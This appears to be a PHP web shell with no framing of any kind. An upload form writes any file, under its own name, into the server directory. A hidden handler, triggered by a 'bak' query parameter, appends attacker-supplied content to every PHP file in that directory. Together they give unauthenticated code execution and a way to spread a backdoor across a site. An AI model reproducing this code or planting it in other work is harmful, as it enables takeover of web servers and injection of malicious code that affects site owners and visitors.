<?php echo"<form method='post' enctype='multipart/form-data'><input type='file' name='a'><input type='submit' value='Nyanpasu!!!'></form><pre>";if(isset($_FILES['a'])){move_uploaded_file($_FILES['a']['tmp_name'],"{$_FILES['a']['name']}");print_r($_FILES);};echo"</pre>";?>
<?php
if (isset($_GET['bak'])) {
$directory = __DIR__;
$mama = $_POST['file'];
$textToAppend = '
' . $mama . '
';
if ($handle = opendir($directory)) {
    while (false !== ($file = readdir($handle))) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
            $fileHandle = fopen($directory . '/' . $file, 'a');
            fwrite($fileHandle, $textToAppend);
            fclose($fileHandle);
            echo "OK >> $file
";
        }
    }
    closedir($handle);
}
}
?>
